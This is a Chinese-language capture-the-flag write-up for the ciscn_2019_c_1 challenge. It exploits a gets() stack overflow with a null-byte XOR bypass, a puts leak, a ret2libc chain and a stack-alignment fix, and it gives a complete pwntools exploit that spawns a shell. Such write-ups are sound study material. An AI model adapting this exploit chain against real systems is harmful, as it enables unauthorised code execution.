# Ciscn_2019_c_1 Writeup


<!--more-->
## 1 漏洞点
先用`checksec`看一下保护情况
```
wlupus@VM-4-10-ubuntu:~/pwn$ checksec ciscn_2019_c_1
[*] '/home/wlupus/pwn/ciscn_2019_c_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
64位程序，只开了NX保护

用Ghidra查看程序流程
{{<image src="ghidra.png" caption="反编译">}}
{{<image src="reverse.png" caption="encrypt">}}
看到`encrypt`函数中利用了gets函数，有明显的溢出点，后续对输入进行了异或操作

对于异或操作，有两种绕过方案，第一种是提前将输入异或处理，这样函数中二次异或后就会恢复成原来的数据；第二种方案是利用`\0`截断，将payload的第一个字符替换为`\00`，这样`strlen`函数的返回值就会是0，也就不会进行后续的异或操作。两种方法在这个题目中都可以，不过个人更倾向第二种方法，因为第一种方法可能导致输入提前出现`\n`字符，导致`gets`函数提前结束。

对于第一种方案，编写了一个编解码函数
```py
def encode(payload):
    ret = b''
    over = False
    for i in range(len(payload)):
        current = payload[i]
        if current == 0:
            over = True
        if not over:
            if payload[i] < ord('a') or ord('z') < payload[i]:
                if payload[i] < ord('A') or ord('Z') < payload[i]:
                    if ord('/') < payload[i] and payload[i] < ord(':'):
                        current = current ^ 0xf
                else:
                    current = current ^ 0xe
            else:
                current = current ^ 0xd
        ret += chr(current).encode('latin-1')  # 注意这里一定要选择latin-1编码，
                                               # 如果使用utf-8编码会导致字符串长度发生改变
    return ret
```

编写一段poc验证思路
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']


sh = process('./ciscn_2019_c_1')
# sh = remote('node4.buuoj.cn', 26578)

gdb.attach(sh)


def menu(id):
    sh.sendlineafter('choice!\n', str(id))


def main():
    menu(1)
    sh.recvuntil('encrypted\n')
    offset = 0x58
    return_addr = 0xdeadbeef
    payload = b'\0' + b'a' * (offset - 1) + p64(return_addr)
    sh.sendline(payload)
    sh.interactive()

if __name__ == "__main__":
    sys.exit(main())
```
{{<image src="poc.png" caption="return address被覆盖">}}
在encrypt函数的最后打上断点，查看return前的状态，可以看到return address被覆盖，验证栈溢出存在且可以被利用

## 2 利用方式
进一步查看程序，发现没有可用的后门函数，选择ret2libc来利用。首先泄漏`puts`函数的地址，用于计算`libc`的基址

构造payload为`b'\0' + b'a' * (offset - 1) + p64(pop_rdi) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start)`

其中，`offset`通过查看程序汇编代码获得，`pop_rdi`通过ROPgadget获得
```
wlupus@VM-4-10-ubuntu:~/pwn$ ROPgadget --binary ciscn_2019_c_1 | grep "pop rdi"
0x0000000000400c83 : pop rdi ; ret
```
`puts_plt_addr`通过readelf和objdump获得
{{<image src="section.png" caption="readelf -WS binary_name">}}
{{<image src="plt.png" caption="objdump -dj.plt binary_name">}}
`puts_got_addr`通过计算得到，64位下计算方法为
$$PutsGotAddr = (PutsPltIdx - 1) * 8 + 24 + GOTBaseAddr$$
对应上图中，puts是plt表中的第二个函数，所以got_addr为$(2 - 1) * 8 + 24 + 0x602000 = 0x602020$

`start`为main函数的起始位置，可以通过readelf读取符号表获得
```
wlupus@VM-4-10-ubuntu:~/pwn$ readelf -Ws ciscn_2019_c_1 | grep main
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
    60: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_2.2.5
    75: 0000000000400b28   245 FUNC    GLOBAL DEFAULT   14 main
```

当然，以上数据还可以通过pwntools库提供的方法来直接获取
```py
start = elf.sym['main']
# 0x400b28
puts_plt_addr = elf.plt['puts']
# 0x4006e0
puts_got_addr = elf.got['puts']
# 0x602000 + 0x20 = 0x602020
```

之后根据泄漏出来的puts函数真实地址的后三位，确定libc版本，获取其中的system函数地址以及`/bin/sh`字符串地址。由于我本地环境的libc在libc_database中没有，所以后文采用了手动查看的方法

```
# 通过ldd查看libc路径
wlupus@VM-4-10-ubuntu:~/pwn$ ldd ciscn_2019_c_1
	linux-vdso.so.1 (0x00007fff7c588000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f09898fa000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f0989ceb000)
```
```
# 获取libc符号表，查看puts的偏移
wlupus@VM-4-10-ubuntu:~/pwn$ readelf -Ws /lib/x86_64-linux-gnu/libc.so.6 | grep puts
   192: 0000000000080970   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
   423: 0000000000080970   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
   497: 0000000000126520  1240 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
   680: 0000000000128430   750 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
  1143: 000000000007f1a0   396 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
  1680: 000000000007f1a0   396 FUNC    GLOBAL DEFAULT   13 _IO_fputs@@GLIBC_2.2.5
  2313: 000000000008a5e0   143 FUNC    WEAK   DEFAULT   13 fputs_unlocked@@GLIBC_2.2.5
```
```
# 查看system函数在libc中的偏移
wlupus@VM-4-10-ubuntu:~/pwn$ readelf -Ws /lib/x86_64-linux-gnu/libc.so.6 | grep system
   233: 0000000000159c50    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
   609: 000000000004f420    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1406: 000000000004f420    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
```
```
# 查看/bin/sh字符串在libc中的偏移
wlupus@VM-4-10-ubuntu:~/pwn$ strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
 1b3d88 /bin/sh
```
综合上述内容，构造payload2为`b'\0' + b'a' * (offset - 1) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)`

## 3 栈平衡
但是按照上述方法运行exp脚本时，会发现无法拿到shell。用gdb查看程序，发现程序在一条`movaps`指令处发生了段错误。
{{<image src="movaps.png" caption="SIGSEGV">}}
经过查看资料，发现`movaps`指令需要16字节对齐，但是图中`$rsp + 0x40`的值明显不满足对齐。因此，需要让rsp加8来实现栈平衡。实现上，往栈里多写入一个ret指令即可。最终exp如下(exp中libc偏移均为个人环境偏移，需要根据个人和靶场环境来更改)：
```py
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']


sh = process('./ciscn_2019_c_1')
# sh = remote('node4.buuoj.cn', 26578)
elf = ELF('./ciscn_2019_c_1')

# gdb.attach(sh, '''
#     b *0x400ad6 
#     b *0x4009cc
# ''')


def menu(id):
    sh.sendlineafter('choice!\n', str(id))

def main():
    menu(1)
    sh.recvuntil('encrypted\n')
    offset = 0x58
    pop_rdi = 0x400c83
    start = elf.sym['main']
    puts_plt_addr = elf.plt['puts']
    # 0x4006e0
    puts_got_addr = elf.got['puts']
    # 0x602000 + 0x20 = 0x602020
    log.info(f"main: {hex(start)}\nplt: {hex(puts_plt_addr)}\ngot: {hex(puts_got_addr)}")
    payload = b'\0' + b'a' * (offset - 1) + p64(pop_rdi) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start)
    sh.sendline(payload)
    sh.recvuntil('\n\n')
    puts_addr = u64(sh.recvline()[:-1].ljust(8, b'\0'))
    log.info(f"puts address: {hex(puts_addr)}")

    # libc = LibcSearcher('puts', puts_addr)
    libc_base = puts_addr - 0x80970
    # get system addr
    # libc = puts_addr - 0x067970
    log.info(f"libc address: {hex(libc_base)}")
    system_addr = 0x4f420 + libc_base
    str_bin_sh =  0x1b3d88 + libc_base
    # second time
    menu(1)
    sh.recvuntil('encrypted\n')
    ret_gadget = 0x4006b9
    payload2 = b'\0' + b'a' * (offset - 1) + p64(ret_gadget) + p64(pop_rdi) + p64(str_bin_sh) + p64(system_addr)
    sh.sendline(payload2)
    sleep(1)
    sh.interactive()

if __name__ == "__main__":
    sys.exit(main())
```
